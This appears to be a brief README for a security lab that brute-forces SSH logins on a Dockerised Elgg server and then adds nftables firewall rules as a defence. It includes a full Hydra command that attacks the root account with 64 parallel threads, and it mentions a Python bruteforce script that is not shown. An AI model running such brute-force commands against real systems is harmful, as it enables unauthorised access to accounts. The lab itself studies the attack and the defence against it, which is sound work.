# GrayHatsLab

To reproduce the experiment:

- Run the Docker Compose config file;
- Install openssh on both client and host (Elgg);
- Run the Python bruteforce script;
- Run Hydra with `hydra -l root -x 3:5:a% www.seed-server.com ssh -s 2222 -t 64 -V` ;
- Add the Elgg and SSH firewalls with `nftables -f ./ruleset` .
